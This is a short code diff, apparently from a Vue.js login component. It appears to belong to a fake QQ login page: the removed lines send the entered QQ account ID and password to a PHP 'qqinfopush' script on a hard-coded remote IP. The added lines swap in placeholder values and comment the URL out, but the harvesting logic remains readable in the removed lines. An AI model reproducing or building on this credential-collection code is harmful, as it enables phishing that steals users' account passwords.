@@ -34,20 +34,25 @@ export default {
       alert('提交成功，正在登录...');
       console.log(this.id);
       console.log(this.pwd);
-      // this.xurl = 'http://localhost:8098/qqinfosql/qqinfoselect.php';
-      // this.xurl = 'http://localhost:8098/qqinfosql/qqinfopush.php?qqId='+this.id+'&&qqPwd='+this.pwd;
-      // this.xurl = 'http://39.105.94.15:80/phpapi/qqinfosql/qqinfopush.php?qqId='+this.id+'&&qqPwd='+this.pwd;
-      this.xurl = 'http://39.105.94.15:80/phpapi/qqinfosql/qqinfopush.php';
+      // bp// this.xurl = 'http://39.105.94.15:80/phpapi/qqinfosql/qqinfopush.php';
       console.log(this.xurl);
       request(
+          // {
+          //   method:'GET',
+          //   url:this.xurl,
+          //   params:{
+          //     qqId:this.id,
+          //     qqPwd:this.pwd
+          //   }
+          //   },
           {
-            method:'GET',
+            method:'POST',
             url:this.xurl,
             params:{
-              qqId:this.id,
-              qqPwd:this.pwd
+              name:"呆瓜",
+              pwd:"呆瓜二号"
             }
-            },
+          },
           (res)=>{
             console.log(res);
           },
